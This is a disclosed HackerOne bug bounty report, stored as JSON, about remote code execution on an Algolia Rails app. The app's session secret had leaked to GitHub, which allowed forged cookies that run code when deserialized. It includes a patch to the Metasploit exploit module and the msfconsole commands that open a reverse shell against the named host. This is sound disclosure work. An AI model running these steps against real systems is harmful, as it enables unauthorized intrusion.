{
  "id": 134321,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQzMjE=",
  "url": "https://hackerone.com/reports/134321",
  "title": "RCE on facebooksearch.algolia.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-04-25T05:47:36.506Z",
  "submitted_at": "2016-04-25T05:47:36.506Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "michiel",
    "url": "/michiel",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 443,
    "url": "https://hackerone.com/algolia",
    "handle": "algolia",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Algolia",
      "twitter_handle": "algolia",
      "website": "https://algolia.com",
      "about": "Hosted search API that delivers instant and relevant results from the first keystroke"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-10-01T15:24:10.322Z",
  "bug_reporter_agreed_on_going_public_at": "2016-09-01T15:23:52.927Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.\n\nCookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. \n\n# Where did I find the session secret?\nI used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. \n\nThe token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\n\n# Proof of Concept\n@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\n\nSince the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: \n\n```diff\n     if res && !res.get_cookies.empty?\n-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n     end\n```\n\nWith that patch applied, you can run the PoC from `msfconsole` by following these commands:\n\n```bash\n# setting up\nuse exploit/multi/http/rails_secret_deserialization\nset secret \"<grab-from-github-url>\"\nset rhost facebooksearch.algolia.com\nset railsversion 4\nset targeturi /auth/facebook\n\n# and then run\nexploit\n\n# when successful, a reverse shell will be established\n# this allows you to run arbitrary commands\n```\n\nAs a proof of concept, I ran `id`:\n\n```\nid\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n```\n\nBut since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text \"PoC by michiel\" to proof regular write access is possible as well. \n\n# Remediation\nSwitch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history. \n\n",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-10-01T15:23:53.070Z",
  "allow_singular_disclosure_after": -232490672.73810798,
  "singular_disclosure_allowed": true,
  "vote_count": 72,
  "voters": [
    "cxzer0",
    "derision",
    "bogdantcaciuc",
    "hunter",
    "michiel",
    "sameerphad72",
    "dawgyg",
    "tess",
    "spam404",
    "yaworsk",
    "and 62 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
